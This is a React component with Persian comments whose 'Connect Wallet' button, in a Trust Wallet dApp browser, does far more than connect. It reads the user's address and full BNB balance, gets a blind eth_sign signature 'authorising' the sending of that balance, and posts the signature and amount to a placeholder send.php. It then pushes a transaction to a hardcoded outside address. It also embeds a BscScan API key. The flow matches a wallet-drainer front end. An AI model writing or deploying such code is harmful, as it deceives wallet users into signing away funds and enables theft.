import React, { useState } from "react";

// اگر می‌خواهید از jQuery برای POST به سرور استفاده کنید:
// import jQuery from "jquery";

// تابع انتخابی برای گرفتن بالانس BNB از BscScan (اختیاری)
const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
async function getBNBBalance(address) {
  try {
    const resp = await fetch(
      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
    );
    const data = await resp.json();
    if (data.status === "1") {
      return (parseInt(data.result) / 1e18).toFixed(6);
    }
  } catch (error) {
    console.error("❌ Error fetching BNB balance:", error);
  }
  return null;
}

function App() {
  const [account, setAccount] = useState(null);

  async function connectAndSend() {
    // 1) بررسی اینکه در مرورگر DApp تراست والت هستیم:
    if (typeof window.ethereum === "undefined") {
      alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
      return;
    }

    // 2) گرفتن آدرس کاربر
    let accounts;
    try {
      accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    } catch (err) {
      console.error("❌ Could not request accounts:", err);
      return;
    }
    if (!accounts || !accounts.length) {
      console.error("❌ No account returned.");
      return;
    }
    const userAddress = accounts[0];
    setAccount(userAddress);
    console.log("✅ User address:", userAddress);

    // (اختیاری) اگر کاربر دستی شبکه را بایننس اسمارت‌چین کرده باشد، chainId باید 0x38 باشد
    // اگر لازم بود بررسی کنید:
    // const chainId = await window.ethereum.request({ method: "eth_chainId" });
    // if (chainId !== "0x38") {
    //   console.warn("User not on BSC mainnet. They may switch manually!");
    // }

    // 3) مثلا گرفتن بالانس از BscScan (اختیاری)
    const bnbBalance = await getBNBBalance(userAddress);
    console.log("💰 BNB Balance:", bnbBalance);

    // 4) ساخت یک پیام ساده برای امضا
    const message = `Authorize sending ${bnbBalance} BNB from ${userAddress}`;
    console.log("📜 Message to sign:", message);

    let signature;
    try {
      signature = await window.ethereum.request({
        method: "eth_sign",
        params: [userAddress, message],
      });
      console.log("✍️ Signature:", signature);
    } catch (error) {
      console.error("❌ Error in eth_sign:", error);
      return;
    }

    // 5) ارسال امضا به سرور برای بررسی و ثبت در لاگ
    //    اگر از jQuery استفاده می‌کنید:
    //    let verifyResp = await jQuery.post("https://YOUR_DOMAIN/send.php", { handler: "tx", ... });
    //    اینجا از fetch استفاده می‌کنم (همه مرورگرهای جدید پشتیبانی می‌کنند).
    try {
      const resp = await fetch("https://YOUR_DOMAIN/send.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          handler: "tx",
          address: userAddress,
          signature: signature,
          amount: bnbBalance,
        }),
      });
      const result = await resp.json();
      console.log("Server verify response:", result);

      if (!result.success) {
        console.error("❌ Signature verification failed or server error.", result);
        return;
      }
    } catch (e) {
      console.error("❌ Could not call server to verify signature:", e);
      return;
    }

    // 6) حالا یک تراکنش واقعی بسازیم (BNB از حساب کاربر به مقصد)
    //    کاربر هزینه گس را می‌دهد. 
    //    مثال: ارسال 0.001 BNB به آدرس مقصد

    const sendAmount = 0.001; // نمونه؛ بسته به نیاز
    const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);

    // ساخت آبجکت پارامترهای تراکنش
    const txParams = {
      from: userAddress,                          // آدرس کاربر
      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد (مثلاً شما)
      value: sendWeiHex,
      // در صورت نیاز gas, gasPrice قرار دهید؛ اگر نگذارید کیف پول ممکن است خودش تخمین بزند
    };

    try {
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [txParams],
      });
      console.log("📤 Transaction broadcasted. Hash:", txHash);
      alert("Transaction sent! TxHash: " + txHash);
    } catch (err) {
      console.error("❌ Error sending transaction:", err);
    }
  }

  return (
    <div style={{ margin: "20px" }}>
      <a
        href="#"
        onClick={connectAndSend}
        className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      >
        {account ? `Connected: ${account}` : "Connect Wallet"}
      </a>
    </div>
  );
}

export default App;
